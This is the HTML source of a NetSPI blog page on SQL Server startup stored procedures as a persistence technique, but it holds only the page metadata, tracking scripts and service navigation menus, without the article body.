@@ -1,0 +1,1548 @@
+<!doctype html>
+<html lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+	
+	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
+
+	<!-- This site is optimized with the Yoast SEO plugin v16.3 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Maintaining Persistence via SQL Server – Part 1: Startup Stored Procedures</title><link rel="stylesheet" href="https://www.netspi.com/wp-content/cache/min/1/d28fd838a244753c513671d1cd0f731b.css" media="all" data-minify="1" />
+	<meta name="description" content="In this blog series, we&#039;re planning to take a look at techniques for maintaining access through SQL Server and how they can be detected by security teams." />
+	<link rel="canonical" href="https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Maintaining Persistence via SQL Server – Part 1: Startup Stored Procedures" />
+	<meta property="og:description" content="In this blog series, we&#039;re planning to take a look at techniques for maintaining access through SQL Server and how they can be detected by security teams." />
+	<meta property="og:url" content="https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/" />
+	<meta property="og:site_name" content="NetSPI" />
+	<meta property="article:published_time" content="2016-03-07T07:00:24+00:00" />
+	<meta property="article:modified_time" content="2021-04-13T00:05:55+00:00" />
+	<meta property="og:image" content="https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_1.png" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:label1" content="Written by">
+	<meta name="twitter:data1" content="Scott Sutherland">
+	<meta name="twitter:label2" content="Est. reading time">
+	<meta name="twitter:data2" content="12 minutes">
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"https://www.netspi.com/#organization","name":"NetSPI","url":"https://www.netspi.com/","sameAs":[],"logo":{"@type":"ImageObject","@id":"https://www.netspi.com/#logo","inLanguage":"en-US","url":"https://www.netspi.com/wp-content/uploads/head-logo-1.png","contentUrl":"https://www.netspi.com/wp-content/uploads/head-logo-1.png","width":138,"height":33,"caption":"NetSPI"},"image":{"@id":"https://www.netspi.com/#logo"}},{"@type":"WebSite","@id":"https://www.netspi.com/#website","url":"https://www.netspi.com/","name":"NetSPI","description":"Trusted by nine of the top 10 U.S. Banks","publisher":{"@id":"https://www.netspi.com/#organization"},"potentialAction":[{"@type":"SearchAction","target":"https://www.netspi.com/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/#primaryimage","inLanguage":"en-US","url":"https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_1.png","contentUrl":"https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_1.png"},{"@type":"WebPage","@id":"https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/#webpage","url":"https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/","name":"Maintaining Persistence via SQL Server \u2013 Part 1: Startup Stored Procedures","isPartOf":{"@id":"https://www.netspi.com/#website"},"primaryImageOfPage":{"@id":"https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/#primaryimage"},"datePublished":"2016-03-07T07:00:24+00:00","dateModified":"2021-04-13T00:05:55+00:00","description":"In this blog series, we're planning to take a look at techniques for maintaining access through SQL Server and how they can be detected by security teams.","breadcrumb":{"@id":"https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/"]}]},{"@type":"BreadcrumbList","@id":"https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/#webpage"}}]},{"@type":"Article","@id":"https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/#article","isPartOf":{"@id":"https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/#webpage"},"author":{"@id":"https://www.netspi.com/#/schema/person/67915d3963a9cb3b982b9ddf0c2734fb"},"headline":"Maintaining Persistence via SQL Server \u2013 Part 1: Startup Stored Procedures","datePublished":"2016-03-07T07:00:24+00:00","dateModified":"2021-04-13T00:05:55+00:00","mainEntityOfPage":{"@id":"https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/#webpage"},"wordCount":1855,"publisher":{"@id":"https://www.netspi.com/#organization"},"image":{"@id":"https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/#primaryimage"},"thumbnailUrl":"https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_1.png","keywords":["SQL Server","powershell","Database Auditing","Persistence","Red Team","StartUp Stored Procedures"],"articleSection":["Technical Blog","Network Penetration Testing"],"inLanguage":"en-US"},{"@type":"Person","@id":"https://www.netspi.com/#/schema/person/67915d3963a9cb3b982b9ddf0c2734fb","name":"Scott Sutherland","image":{"@type":"ImageObject","@id":"https://www.netspi.com/#personlogo","inLanguage":"en-US","url":"https://www.netspi.com/wp-content/uploads/Scott_Sutherland.jpg","contentUrl":"https://www.netspi.com/wp-content/uploads/Scott_Sutherland.jpg","caption":"Scott Sutherland"},"description":"Scott is currently responsible for the development, and execution of network penetration testing at NetSPI. His role includes researching and developing tools, techniques, and methodologies used during network and application penetration tests. Scott has been providing IT security services to medium sized to Fortune 50 companies for over 10 years. As an active participant in the information security community, Scott also contributes technical security blog posts, whitepapers, and presentations on a regular basis through NetSPI. Published presentations can be found here. Scott's most recent project is PowerUpSQL.","url":"https://www.netspi.com/author/scott-sutherland/"}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel='dns-prefetch' href='//maps.googleapis.com' />
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='dns-prefetch' href='//use.typekit.net' />
+<link href='https://fonts.gstatic.com' crossorigin rel='preconnect' />
+<link rel="alternate" type="application/rss+xml" title="NetSPI &raquo; Feed" href="https://www.netspi.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="NetSPI &raquo; Comments Feed" href="https://www.netspi.com/comments/feed/" />
+<style>
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	
+
+
+
+
+<link rel='stylesheet' id='google-fonts-css'  href='https://fonts.googleapis.com/css?family=Lato%3A400%2C500%2C600%2C700%7CRoboto%3A400%2C500%2C600%2C700&#038;ver=2.5.1&#038;display=swap' media='all' />
+
+
+
+
+
+
+
+
+
+
+
+<style id='rocket-lazyload-inline-css'>
+.rll-youtube-player{position:relative;padding-bottom:56.23%;height:0;overflow:hidden;max-width:100%;}.rll-youtube-player iframe{position:absolute;top:0;left:0;width:100%;height:100%;z-index:100;background:0 0}.rll-youtube-player img{bottom:0;display:block;left:0;margin:auto;max-width:100%;width:100%;position:absolute;right:0;top:0;border:none;height:auto;cursor:pointer;-webkit-transition:.4s all;-moz-transition:.4s all;transition:.4s all}.rll-youtube-player img:hover{-webkit-filter:brightness(75%)}.rll-youtube-player .play{height:72px;width:72px;left:50%;top:50%;margin-left:-36px;margin-top:-36px;position:absolute;background:url(https://www.netspi.com/wp-content/plugins/wp-rocket/assets/img/youtube.png) no-repeat;cursor:pointer}
+</style>
+
+
+<script id='tc-cart-js-extra'>
+var tc_ajax = {"ajaxUrl":"https:\/\/www.netspi.com\/wp-admin\/admin-ajax.php","emptyCartMsg":"Are you sure you want to remove all tickets from your cart?","success_message":"Ticket Added!","imgUrl":"https:\/\/www.netspi.com\/wp-content\/plugins\/tickera\/images\/ajax-loader.gif","addingMsg":"Adding ticket to cart...","outMsg":"In Your Cart","cart_url":"https:\/\/www.netspi.com\/tickets-cart\/","update_cart_message":"Please update your cart before proceeding.","tc_provide_your_details":"In order to continue you need to agree to provide your details.","tc_gateway_collection_data":"","tc_error_message":"Only customers aged 16 or older are permitted for purchase on this website","tc_show_age_check":"no","tc_field_error":"This field required *"};
+</script>
+
+
+<script src='https://maps.googleapis.com/maps/api/js?key=AIzaSyBiqcohT882GYkFl60LilI2BkFF4TxT0kE&#038;libraries=places&#038;language=en&#038;region=US&#038;ver=5.7.1' id='srm_gmap_api-js'></script>
+
+
+
+
+<script id='cookie-notice-front-js-extra'>
+var cnArgs = {"ajaxUrl":"https:\/\/www.netspi.com\/wp-admin\/admin-ajax.php","nonce":"e994d8cc25","hideEffect":"fade","position":"bottom","onScroll":"0","onScrollOffset":"100","onClick":"0","cookieName":"cookie_notice_accepted","cookieTime":"2592000","cookieTimeRejected":"2592000","cookiePath":"\/","cookieDomain":"","redirection":"0","cache":"1","refuse":"0","revokeCookies":"0","revokeCookiesOpt":"automatic","secure":"1"};
+</script>
+
+<link rel="https://api.w.org/" href="https://www.netspi.com/wp-json/" /><link rel="alternate" type="application/json" href="https://www.netspi.com/wp-json/wp/v2/posts/6091" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.netspi.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.netspi.com/wp-includes/wlwmanifest.xml" /> 
+<link rel='shortlink' href='https://www.netspi.com/?p=6091' />
+<!-- Start Drift By WP-Plugin: Drift -->
+<!-- Start of Async Drift Code -->
+<script data-rocketlazyloadscript='data:text/javascript;base64,DQoidXNlIHN0cmljdCI7DQoNCiFmdW5jdGlvbigpIHsgdmFyIHQgPSB3aW5kb3cuZHJpZnR0ID0gd2luZG93LmRyaWZ0ID0gd2luZG93LmRyaWZ0dCB8fCBbXTsgaWYgKCF0LmluaXQpIHsgaWYgKHQuaW52b2tlZCkgcmV0dXJuIHZvaWQgKHdpbmRvdy5jb25zb2xlICYmIGNvbnNvbGUuZXJyb3IgJiYgY29uc29sZS5lcnJvcigiRHJpZnQgc25pcHBldCBpbmNsdWRlZCB0d2ljZS4iKSk7IHQuaW52b2tlZCA9ICEwLCB0Lm1ldGhvZHMgPSBbICJpZGVudGlmeSIsICJjb25maWciLCAidHJhY2siLCAicmVzZXQiLCAiZGVidWciLCAic2hvdyIsICJwaW5nIiwgInBhZ2UiLCAiaGlkZSIsICJvZmYiLCAib24iIF0sIHQuZmFjdG9yeSA9IGZ1bmN0aW9uKGUpIHsgcmV0dXJuIGZ1bmN0aW9uKCkgeyB2YXIgbiA9IEFycmF5LnByb3RvdHlwZS5zbGljZS5jYWxsKGFyZ3VtZW50cyk7IHJldHVybiBuLnVuc2hpZnQoZSksIHQucHVzaChuKSwgdDsgfTsgfSwgdC5tZXRob2RzLmZvckVhY2goZnVuY3Rpb24oZSkgeyB0W2VdID0gdC5mYWN0b3J5KGUpOyB9KSwgdC5sb2FkID0gZnVuY3Rpb24odCkgeyB2YXIgZSA9IDNlNSwgbiA9IE1hdGguY2VpbChuZXcgRGF0ZSgpIC8gZSkgKiBlLCBvID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7IG8udHlwZSA9ICJ0ZXh0L2phdmFzY3JpcHQiLCBvLmFzeW5jID0gITAsIG8uY3Jvc3NvcmlnaW4gPSAiYW5vbnltb3VzIiwgby5zcmMgPSAiaHR0cHM6Ly9qcy5kcmlmdHQuY29tL2luY2x1ZGUvIiArIG4gKyAiLyIgKyB0ICsgIi5qcyI7IHZhciBpID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoInNjcmlwdCIpWzBdOyBpLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKG8sIGkpOyB9OyB9DQp9KCk7DQpkcmlmdC5TTklQUEVUX1ZFUlNJT04gPSAnMC4zLjEnOw0KZHJpZnQubG9hZCgncDI1ZW15aTNzcnM5Jyk7DQo=' ></script>
+<!-- End of Async Drift Code --><!-- end: Drift Code. -->
+<style id="mystickymenu" type="text/css">#mysticky-nav { width:100%; position: static; }#mysticky-nav.wrapfixed { position:fixed; left: 0px; margin-top:0px;  z-index: 99990; -webkit-transition: 0.3s; -moz-transition: 0.3s; -o-transition: 0.3s; transition: 0.3s; -ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=90)"; filter: alpha(opacity=90); opacity:0.9; background-color: #f7f5e7;}#mysticky-nav.wrapfixed .myfixed{ background-color: #f7f5e7; position: relative;top: auto;left: auto;right: auto;}#mysticky-nav .myfixed { margin:0 auto; float:none; border:0px; background:none; max-width:100%; }</style>			<style type="text/css">
+																															</style>
+			
+<link rel="preload" as="font" href="https://www.netspi.com/wp-content/themes/netspi/assets/fonts/fa-solid-900.woff2" crossorigin>
+<link rel="preload" as="font" href="https://www.netspi.com/wp-content/themes/netspi/assets/fonts/fa-brands-400.woff2" crossorigin><style>.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>				<style id="uagb-style-conditional-extension">@media (min-width: 1025px){body .uag-hide-desktop.uagb-google-map__wrap,body .uag-hide-desktop{display:none}}@media (min-width: 768px) and (max-width: 1024px){body .uag-hide-tab.uagb-google-map__wrap,body .uag-hide-tab{display:none}}@media (max-width: 767px){body .uag-hide-mob.uagb-google-map__wrap,body .uag-hide-mob{display:none}}</style>
+			<style type="text/css">/** Mega Menu CSS: fs **/</style>
+<noscript><style id="rocket-lazyload-nojs-css">.rll-youtube-player, [data-lazy-src]{display:none !important;}</style></noscript>        <!-- tracking code --><!-- Google Tag Manager -->
+<script data-rocketlazyloadscript='data:text/javascript;base64,KGZ1bmN0aW9uKHcsZCxzLGwsaSl7d1tsXT13W2xdfHxbXTt3W2xdLnB1c2goeydndG0uc3RhcnQnOg0KbmV3IERhdGUoKS5nZXRUaW1lKCksZXZlbnQ6J2d0bS5qcyd9KTt2YXIgZj1kLmdldEVsZW1lbnRzQnlUYWdOYW1lKHMpWzBdLA0Kaj1kLmNyZWF0ZUVsZW1lbnQocyksZGw9bCE9J2RhdGFMYXllcic/JyZsPScrbDonJztqLmFzeW5jPXRydWU7ai5zcmM9DQonaHR0cHM6Ly93d3cuZ29vZ2xldGFnbWFuYWdlci5jb20vZ3RtLmpzP2lkPScraStkbDtmLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGosZik7DQp9KSh3aW5kb3csZG9jdW1lbnQsJ3NjcmlwdCcsJ2RhdGFMYXllcicsJ0dUTS1LMlFYWkozJyk7' ></script>
+<!-- End Google Tag Manager -->
+	<!-- tracking code/ -->	
+	
+	
+	
+	
+</head>
+
+<body class="post-template-default single single-post postid-6091 single-format-standard mega-menu-custom-megamenu cookies-not-set">
+	    
+            <!-- bodyscript -->
+	<div style="display: none;">
+		<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-K2QXZJ3"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->	</div> <!-- bodyscript/ -->
+	<div id="page" class="site site-page-wrapper">
+		<header class="site-header">
+			<div class="container-lg">
+				<div class="row valign-wrapper">
+					<div class="col s8 m4 l2">
+						<div class="head-logo">
+							<a href="https://www.netspi.com/">
+								<img class="white-header-logo" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20138%2033'%3E%3C/svg%3E" width="138" height="33" data-lazy-src="https://www.netspi.com/wp-content/uploads/2021/01/head-logo-1.svg"><noscript><img class="white-header-logo" src="https://www.netspi.com/wp-content/uploads/2021/01/head-logo-1.svg" width="138" height="33"></noscript>
+								<img class="dark-header-logo" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20138%2033'%3E%3C/svg%3E" width="138" height="33" data-lazy-src="https://www.netspi.com/wp-content/uploads/white-logo.svg"><noscript><img class="dark-header-logo" src="https://www.netspi.com/wp-content/uploads/white-logo.svg" width="138" height="33"></noscript>
+							</a>
+						</div>
+					</div>				
+					<div class="col s4 m8 l10 display-none menutoggel col-mid d-flex justify-content-between">
+						<div class="head-menus head-menu-loged">
+							<div id="mega-menu-wrap-custom-megamenu" class="mega-menu-wrap"><div class="mega-menu-toggle"><div class="mega-toggle-blocks-left"></div><div class="mega-toggle-blocks-center"></div><div class="mega-toggle-blocks-right"><div class='mega-toggle-block mega-menu-toggle-animated-block mega-toggle-block-0' id='mega-toggle-block-0'><button aria-label="Toggle Menu" class="mega-toggle-animated mega-toggle-animated-slider" type="button" aria-expanded="false">
+                  <span class="mega-toggle-animated-box">
+                    <span class="mega-toggle-animated-inner"></span>
+                  </span>
+                </button></div></div></div><ul id="mega-menu-custom-megamenu" class="mega-menu max-mega-menu mega-menu-horizontal mega-no-js" data-event="hover" data-effect="fade" data-effect-speed="200" data-effect-mobile="slide_right" data-effect-speed-mobile="200" data-panel-width=".container-lg" data-mobile-force-width="body" data-second-click="go" data-document-click="collapse" data-vertical-behaviour="standard" data-breakpoint="1024" data-unbind="true" data-mobile-state="collapse_all" data-hover-intent-timeout="300" data-hover-intent-interval="100"><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-megamenu mega-menu-item-has-children mega-align-bottom-left mega-menu-megamenu mega-menu-item-20872' id='mega-menu-item-20872'><a class="mega-menu-link" href="/services/" aria-haspopup="true" aria-expanded="false" tabindex="0">Penetration Testing<span class="mega-indicator"></span></a>
+<ul class="mega-sub-menu">
+<li class='mega-menu-item mega-menu-item-type-widget widget_text mega-menu-columns-1-of-4 mega-menu-item-text-14' id='mega-menu-item-text-14'>			<div class="textwidget"><div class="mega-menu-blocks">
+<div class="mega-menu-blocks-col">
+<div class="mega-block-tite"><span class="img-icon"><img class="size-full wp-image-20908 alignleft" style="width: 27px; height: 27px;" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2027%2020'%3E%3C/svg%3E" alt="" width="27" height="20" data-lazy-src="https://www.netspi.com/wp-content/uploads/ptaas-ic.svg" /><noscript><img class="size-full wp-image-20908 alignleft" style="width: 27px; height: 27px;" src="http://www.netspi.com/wp-content/uploads/ptaas-ic.svg" alt="" width="27" height="20" /></noscript><br />
+</span><br />
+<a href="http://www.netspi.com/security-testing/penetration-testing-as-a-service">Pentesting as a Service</a></div>
+<div class="mega-block-desc"><span style="font-weight: 400;">Better manage your vulnerabilities with world-class pentest execution and delivery</span></div>
+</div>
+<div class="mega-menu-blocks-col">
+<div class="mega-block-tite"><span class="img-icon"><img class="size-full wp-image-20908 alignleft" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2027%2020'%3E%3C/svg%3E" alt="" width="27" height="20" data-lazy-src="https://www.netspi.com/wp-content/uploads/2021/02/adversarial-simulation-icon-1.svg" /><noscript><img class="size-full wp-image-20908 alignleft" src="http://www.netspi.com/wp-content/uploads/2021/02/adversarial-simulation-icon-1.svg" alt="" width="27" height="20" /></noscript></span><br />
+<a href="http://www.netspi.com/security-testing/adversary-simulation">Adversary Simulation</a></div>
+<div class="mega-block-desc"><span style="font-weight: 400;">Perform red team, assumed breach, ransomware, and detective control assessments.<br />
+</span></div>
+</div>
+</div>
+</div>
+		</li><li class='mega-menu-item mega-menu-item-type-widget widget_text mega-menu-columns-1-of-4 mega-menu-item-text-15' id='mega-menu-item-text-15'>			<div class="textwidget"><div class="mega-menu-blocks">
+<div class="mega-menu-blocks-col">
+<div class="mega-block-tite"><span class="img-icon"><br />
+<img class="alignnone size-medium wp-image-11929" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2027%2020'%3E%3C/svg%3E" alt="" width="27" height="20" data-lazy-src="https://www.netspi.com/wp-content/uploads/2021/02/application-pentesting-icon-1.svg" /><noscript><img class="alignnone size-medium wp-image-11929" src="http://www.netspi.com/wp-content/uploads/2021/02/application-pentesting-icon-1.svg" alt="" width="27" height="20" /></noscript><br />
+</span><br />
+<a href="http://www.netspi.com/security-testing/application-penetration-testing" rel="noopener">Application Pentesting</a></div>
+<div class="mega-block-desc"><span style="font-weight: 400;">Find, validate, and fix vulnerabilities on your web, mobile, thick, and virtual applications.</span></div>
+</div>
+<div class="mega-menu-blocks-col">
+<div class="mega-block-tite"><span class="img-icon"><br />
+<img class="size-full wp-image-20908 alignleft" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2027%2020'%3E%3C/svg%3E" alt="" width="27" height="20" data-lazy-src="https://www.netspi.com/wp-content/uploads/2021/02/social-engineering-icon.svg" /><noscript><img class="size-full wp-image-20908 alignleft" src="http://www.netspi.com/wp-content/uploads/2021/02/social-engineering-icon.svg" alt="" width="27" height="20" /></noscript><br />
+</span><br />
+<a href="http://www.netspi.com/security-testing/social-engineering" rel="noopener">Social Engineering</a></div>
+<div class="mega-block-desc"><span style="font-weight: 400;">Put your employees to the test through email, phone, or physical security assessments.</span></div>
+</div>
+</div>
+</div>
+		</li><li class='mega-menu-item mega-menu-item-type-widget widget_text mega-menu-columns-1-of-4 mega-menu-item-text-16' id='mega-menu-item-text-16'>			<div class="textwidget"><div class="mega-menu-blocks">
+<div class="mega-menu-blocks-col">
+<div class="mega-block-tite"><span class="img-icon"><br />
+<img class="size-full wp-image-20908 alignleft" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2027%2020'%3E%3C/svg%3E" alt="" width="27" height="20" data-lazy-src="https://www.netspi.com/wp-content/uploads/2021/02/network-pentesting-icon-1.svg" /><noscript><img class="size-full wp-image-20908 alignleft" src="http://www.netspi.com/wp-content/uploads/2021/02/network-pentesting-icon-1.svg" alt="" width="27" height="20" /></noscript><br />
+</span><br />
+<a href="http://www.netspi.com/security-testing/network-penetration-testing">Network Pentesting</a></div>
+<div class="mega-block-desc"><span style="font-weight: 400;">Find, validate, and fix vulnerabilities on your internal, external, and wireless networks and standard system builds.</span></div>
+</div>
+<div class="mega-menu-blocks-col">
+<div class="mega-block-tite"><span class="img-icon"><br />
+<img class="wp-image-20909 size-full alignleft" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2030%2020'%3E%3C/svg%3E" alt="" width="30" height="20" data-lazy-src="https://www.netspi.com/wp-content/uploads/2021/02/strategic-advisory-icon-1.svg" /><noscript><img class="wp-image-20909 size-full alignleft" src="http://www.netspi.com/wp-content/uploads/2021/02/strategic-advisory-icon-1.svg" alt="" width="30" height="20" /></noscript><br />
+</span><br />
+<a href="http://www.netspi.com/security-testing/strategic-advisory-services">Strategic Advisory</a></div>
+<div class="mega-block-desc"><span style="font-weight: 400;">Build a mature security program with AppSec as a Service, program assessments, and threat modeling.<br />
+</span></div>
+</div>
+</div>
+</div>
+		</li><li class='mega-menu-item mega-menu-item-type-widget widget_text mega-menu-columns-1-of-4 mega-menu-item-text-17' id='mega-menu-item-text-17'>			<div class="textwidget"><div class="mega-menu-blocks">
+<div class="mega-menu-blocks-col">
+<div class="mega-block-tite"><span class="img-icon"><br />
+<img class="alignnone size-medium wp-image-11931" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2027%2020'%3E%3C/svg%3E" alt="" width="27" height="20" data-lazy-src="https://www.netspi.com/wp-content/uploads/2021/02/cloud-pentesting-icon-1.svg" /><noscript><img class="alignnone size-medium wp-image-11931" src="http://www.netspi.com/wp-content/uploads/2021/02/cloud-pentesting-icon-1.svg" alt="" width="27" height="20" /></noscript><br />
+</span><br />
+<a href="http://www.netspi.com/security-testing/cloud-penetration-testing">Cloud Pentesting</a></div>
+<div class="mega-block-desc"><span style="font-weight: 400;">Find, validate, and fix vulnerabilities on your AWS, Azure, and Google cloud infrastructures.<br />
+</span></div>
+</div>
+<div class="mega-menu-blocks-col">
+<div class="mega-block-tite"><span class="img-icon"><br />
+<img class="wp-image-20909 size-full alignleft" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2030%2020'%3E%3C/svg%3E" alt="" width="30" height="20" data-lazy-src="https://www.netspi.com/wp-content/uploads/2021/02/secure-code-review-icon.svg" /><noscript><img class="wp-image-20909 size-full alignleft" src="http://www.netspi.com/wp-content/uploads/2021/02/secure-code-review-icon.svg" alt="" width="30" height="20" /></noscript><br />
+</span><br />
+<a href="http://www.netspi.com/security-testing/secure-code-review">Secure Code Review</a></div>
+<div class="mega-block-desc"><span style="font-weight: 400;">Find application security vulnerabilities earlier in your SDLC with SAST, SCR, triaging, and remediation validation.</span></div>
+</div>
+</div>
+</div>
+		</li></ul>
+</li><li class='mega-video-sub-menu mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-megamenu mega-menu-item-has-children mega-align-bottom-left mega-menu-megamenu mega-menu-item-20873 video-sub-menu' id='mega-menu-item-20873'><a class="mega-menu-link" href="/technology/" aria-haspopup="true" aria-expanded="false" tabindex="0">Technology<span class="mega-indicator"></span></a>
+<ul class="mega-sub-menu">
+<li class='mega-menu-item mega-menu-item-type-widget widget_text mega-menu-columns-1-of-4 mega-menu-item-text-28' id='mega-menu-item-text-28'>			<div class="textwidget"><div class="mega-menu-video">
+<div class="mega-menu-videoblock"><div class="wonderplugin-video" style="width:600px;height:400px;position:relative;display:block;background-color:#000;overflow:hidden;max-width:100%;margin:0 auto;" data-aspectratio="1.5"><a class="wpve-lightbox wplightbox" href="https://www.youtube.com/embed/FF4y_4WgVxk" data-autoplay="true" data-width=960 data-height=540><div class="wpve-poster"><img width="1280" height="720" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201280%20720'%3E%3C/svg%3E" data-lazy-src="https://www.netspi.com/wp-content/uploads/resolve-poster.jpg" /><noscript><img width="1280" height="720" src="http://www.netspi.com/wp-content/uploads/resolve-poster.jpg" /></noscript></div><div data-bg="https://www.netspi.com/wp-content/uploads/2021/02/video-play-icon.svg" class="wpve-playbutton rocket-lazyload" style="position:absolute;top:0;left:0;width:100%;height:100%;background-position:center center;background-repeat:no-repeat;"></div></a></div></div>
+<p><a class="btn-text" href="https://www.netspi.com/technology/resolve/">Learn More <i class="fas fa-arrow-right"></i></a></p>
+</div>
+</div>
+		</li><li class='mega-menu-item mega-menu-item-type-widget widget_text mega-menu-columns-1-of-4 mega-menu-item-text-26' id='mega-menu-item-text-26'>			<div class="textwidget"><div class="mega-menu-blocks">
+<div class="mega-menu-blocks-col">
+<div class="mega-block-tite"><span class="img-icon"><br />
+<img class="alignnone wp-image-21657 size-full" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20278%20278'%3E%3C/svg%3E" alt="" width="278" height="278" data-lazy-src="https://www.netspi.com/wp-content/uploads/Resolve-Icon.png" /><noscript><img class="alignnone wp-image-21657 size-full" src="http://www.netspi.com/wp-content/uploads/Resolve-Icon.png" alt="" width="278" height="278" /></noscript><br />
+</span><br />
+<a href="http://www.netspi.com/technology/resolve/">Resolve&trade;</a></div>
+<div class="mega-block-desc"><span style="font-weight: 400;">Elevate your vulnerability management program.</span></div>
+</div>
+</div>
+</div>
+		</li><li class='mega-menu-item mega-menu-item-type-widget widget_text mega-menu-columns-1-of-4 mega-menu-item-text-27' id='mega-menu-item-text-27'>			<div class="textwidget"><div class="mega-menu-video">
+<div class="mega-menu-videoblock"><div class="wonderplugin-video" style="width:600px;height:400px;position:relative;display:block;background-color:#000;overflow:hidden;max-width:100%;margin:0 auto;" data-aspectratio="1.5"><a class="wpve-lightbox wplightbox" href="https://www.youtube.com/embed/zAFdEiGFQC4" data-autoplay="true" data-width=960 data-height=540><div class="wpve-poster"><img width="1280" height="720" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201280%20720'%3E%3C/svg%3E" data-lazy-src="https://www.netspi.com/wp-content/uploads/red-team-toolkit.jpg" /><noscript><img width="1280" height="720" src="http://www.netspi.com/wp-content/uploads/red-team-toolkit.jpg" /></noscript></div><div data-bg="https://www.netspi.com/wp-content/uploads/2021/02/video-play-icon.svg" class="wpve-playbutton rocket-lazyload" style="position:absolute;top:0;left:0;width:100%;height:100%;background-position:center center;background-repeat:no-repeat;"></div></a></div></div>
+<p><a class="btn-text" href="http://www.netspi.com/technology/red-team-toolkit/">Learn More <i class="fas fa-arrow-right"></i></a></p>
+</div>
+</div>
+		</li><li class='mega-menu-item mega-menu-item-type-widget widget_text mega-menu-columns-1-of-4 mega-menu-item-text-29' id='mega-menu-item-text-29'>			<div class="textwidget"><div class="mega-menu-blocks">
+<div class="mega-menu-blocks-col">
+<div class="mega-block-tite"><span class="img-icon"><br />
